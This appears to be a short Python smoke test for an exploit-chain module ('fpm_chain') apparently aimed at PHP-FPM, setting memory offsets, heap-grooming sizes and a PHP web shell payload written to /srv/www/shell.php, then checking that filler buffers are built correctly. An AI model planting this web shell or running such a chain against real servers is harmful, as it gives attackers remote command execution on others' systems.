#!/usr/bin/env python3
"""Smoke test: construct a two-field Chain (exercises __init__ checks)."""
import os
import sys
from types import SimpleNamespace

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fpm_chain  # noqa: E402

a = SimpleNamespace(
    url="http://127.0.0.1", timeout=5.0,
    e_off=0x83000, dt_off=0x6B000,
    scalar_push=0x63058, array_push=0x63050, writer=0x58238,
    filler=131072, fstart=100,
    fstart_dt=None, fstart_e=None,
    big_dt_size=13312, big_e_size=45056,
    base_dt=0x68018, base_e=0x81018, lead=0,
    press=920, prime_press=400, fields=170, field_len=4000, levels=60,
    small=73, big=53, fnlen=750000,
    dup="0,2,3", workers=1, attempts=1, settle=0.5,
    payload="<?php system($_GET[0]); ?>",
    shell_path="/srv/www/shell.php", shell_url="/shell.php",
    plain="/index.php", index="/index.php", cmd="id", proof="",
)
c = fpm_chain.Chain(a)
assert c.two_field
v = c.build_filler([(0x6B000, b"\x00" * 8)], size=13312, base=0x68018)
assert len(v) == 13312 and v[0x2FE8:0x2FF0] == b"\x00" * 8
v2 = c.build_filler([(0x83000, b"\x11" * 8)], size=45056, base=0x81018)
assert len(v2) == 45056 and v2[0x1FE8:0x1FF0] == b"\x11" * 8
print("SMOKE_OK")
